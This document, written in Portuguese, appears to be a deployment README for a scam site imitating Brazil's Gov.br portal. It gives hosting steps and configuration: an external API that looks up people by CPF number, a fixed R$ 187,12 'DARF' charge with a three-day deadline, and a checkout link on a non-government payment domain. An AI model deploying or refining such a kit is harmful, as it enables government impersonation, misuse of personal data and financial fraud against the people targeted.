# 🚀 DEPLOY RÁPIDO - Sistema CPF Gov.br

## 📋 Instruções de Hospedagem

### ✅ Arquivos Prontos para Produção
Todos os arquivos estão otimizados e prontos para hospedagem na pasta `dist/`.

### 🌐 Opções de Hospedagem

#### 1. **Hospedagem Compartilhada** (Recomendada)
- Faça upload de todos os arquivos da pasta `dist/` para a raiz do domínio
- Certifique-se de que `index.html` está na pasta principal
- Acesse seu domínio diretamente

#### 2. **Vercel** (Gratuito)
```bash
# Instale o Vercel CLI
npm i -g vercel

# Navegue até a pasta dist
cd dist

# Deploy
vercel --prod
```

#### 3. **Netlify** (Gratuito)
- Arraste a pasta `dist/` para netlify.com
- Ou conecte com GitHub e configure build folder como `dist`

#### 4. **GitHub Pages**
- Faça upload dos arquivos para um repositório
- Ative GitHub Pages nas configurações
- Configure source como `/root` ou `/docs`

### 🔧 Configurações Importantes

- **API CPF:** `https://encurtaapi.com/api/typebot?cpf=`
- **Checkout:** `https://pay.meupagamentoseguro.site/521rZJz0NDwZeaX`
- **Valor DARF:** R$ 187,12 (fixo)
- **Prazo:** 3 dias para regularização

### 📱 Teste Local
```bash
cd dist
python3 -m http.server 8000
# Acesse: http://localhost:8000
```

### 🛡️ Segurança
- Use HTTPS em produção
- Configure headers de segurança (arquivos incluídos)
- Monitore logs de acesso

---
**Sistema pronto para produção!** 🎉
